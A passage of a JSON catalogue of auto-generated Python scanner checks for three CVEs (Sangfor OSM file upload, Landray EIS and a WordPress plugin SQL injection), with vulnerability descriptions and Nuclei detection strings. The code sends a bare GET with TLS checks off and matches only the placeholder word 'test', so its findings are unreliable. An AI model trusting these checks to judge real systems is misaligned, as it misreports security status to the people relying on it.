{result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Sangfor OSM - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_15503(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-15503\nName: Sangfor OSM - Arbitrary File Upload\nSeverity: critical\nDescription: Sangfor Operation and Maintenance Management System <= 3.0.8 contains an unrestricted file upload vulnerability caused by manipulation of the \\\"File\\\" argument in /fort/trust/version/common/common.jsp, letting remote attackers upload arbitrary files, exploit requires no special privileges.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_15503:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-15503\"\n    SEVERITY = \"critical\"\n    NAME = \"Sangfor OSM - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"Upload success\") / [OR] DSL: status_code == 200; contains(body, md5(to_string(randnum)))'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Sangfor OSM - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_15503(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2025-15503"
        ],
        "tags": [
          "cve",
          "cve2025",
          "sangfor",
          "osm",
          "rce",
          "fileupload",
          "intrusive",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_22214",
        "name": "Landray EIS SQL注入漏洞",
        "language": "Python",
        "famille": "CVE",
        "description": "Landray EIS 2001 through 2006 contains a SQL injection caused by unsanitized input in Message/fi_message_receiver.aspx?replyid=, letting attackers execute arbitrary SQL commands, exploit requires crafted input.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 500; contains_all(body, \"202CB962AC59075B964B07152D234B70\", \"varchar\", \"Landray\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-22214\nName: Landray EIS SQL注入漏洞\nSeverity: critical\nDescription: Landray EIS 2001 through 2006 contains a SQL injection caused by unsanitized input in Message/fi_message_receiver.aspx?replyid=, letting attackers execute arbitrary SQL commands, exploit requires crafted input.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_22214:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-22214\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray EIS SQL注入漏洞\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 500; contains_all(body, \"202CB962AC59075B964B07152D234B70\", \"varchar\", \"Landray\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray EIS SQL注入漏洞\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_22214(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-22214\nName: Landray EIS SQL注入漏洞\nSeverity: critical\nDescription: Landray EIS 2001 through 2006 contains a SQL injection caused by unsanitized input in Message/fi_message_receiver.aspx?replyid=, letting attackers execute arbitrary SQL commands, exploit requires crafted input.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_22214:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-22214\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray EIS SQL注入漏洞\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 500; contains_all(body, \"202CB962AC59075B964B07152D234B70\", \"varchar\", \"Landray\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray EIS SQL注入漏洞\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_22214(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "landray",
          "sqli",
          "intrusive",
          "vuln",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_22785",
        "name": "Course Booking System <= 6.0.6 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The Course Booking System plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 6.0.6 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
        "severity": "critical",
        "detection": "[OR] DSL: duration >= 8; len(body) == 0",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-22785\nName: Course Booking System <= 6.0.6 - SQL Injection\nSeverity: critical\nDescription: The Course Booking System plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 6.0.6 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_22785:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-22785\"\n    SEVERITY = \"critical\"\n    NAME = \"Course Booking System <= 6.0.6 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration >= 8; len(body) == 0'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Course Booking System <= 6.0.6 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_22785(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-22785\nName: Course Booking System <= 6.0.6 - SQL Injection\nSeverity: critical\nDescription: The Course Booking System plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 6.0.6 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_22785:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-22785\"\n    SEVERITY = \"critical\"\n    NAME = \"Course Booking System <= 6.0.6 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration >= 8; len(body) == 0'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Course Booking System <= 6.0.6 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_22785(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "wordpress",
          "wp",
          "wp-plugin",
          "sqli",
